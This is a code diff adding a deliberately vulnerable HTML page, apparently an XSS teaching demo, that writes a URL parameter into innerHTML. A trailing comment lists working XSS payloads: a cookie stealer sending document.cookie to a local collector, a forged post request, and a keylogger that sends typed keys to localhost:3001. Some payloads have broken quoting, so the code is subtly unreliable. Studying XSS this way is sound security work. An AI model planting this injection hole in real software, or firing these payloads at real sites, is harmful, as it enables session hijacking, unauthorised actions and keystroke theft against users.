@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security xss attacks</title>
+</head>
+<body>
+    <div class="row">
+        <div class="col-12">
+            Welcome, <span id="username"></span>!
+        </div>
+    </div>
+    <script>
+        const params= new URLSearchParams(window.location.search);
+        const name = params.get("name");
+        document.getElementById("username").innerHTML = name
+
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + "; path=/";
+        }
+
+        function createPost(title, description) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", '/post', true);
+            console.log(document.cookie);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader(
+            "Content-type",
+            "application/x-www-form-urlencoded"
+            );
+            xhr.send(`txtName=${title}&mtxMessage=${description}`)
+        }
+
+        setCookie("exampleCookie", "Hello, Cookie!", 7);
+    </script>
+</body>
+</html>
+
+
+<!-- - User session hijacking
+?name=<img src=\"does-not-exist\" onerror=\"var img = document.createElement(\'img\');
+img.src='http://127.0.0.1:5501/cookie?data=${document.cookie}`;
+document.querySelector(\'body\').appendChild(img);\">
+
+
+- Unathorized activities
+?name=<img src="error.gif" onerror="createPost('HACK_TITLE', 'HACK_DESCRIPTION');" /> 
+
+- Capturing keystrokes
+Code
+<img src="error.gif" onerror="
+var timeout;
+var buffer = ";
+document.querySelector('body').addEventListener('keypress', function(event) {
+if (event.which !== 0) {
+clearTimeout(timeout);
+buffer += String.fromCharCode(event.which);
+timeout = setTimeout(function() {
+var xhr = new XMLHttpRequest();
+var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
+xhr.open('GET', uri);
+xhr.send();
+buffer = ";
+}, 400);
+}
+});" /> 
+-->
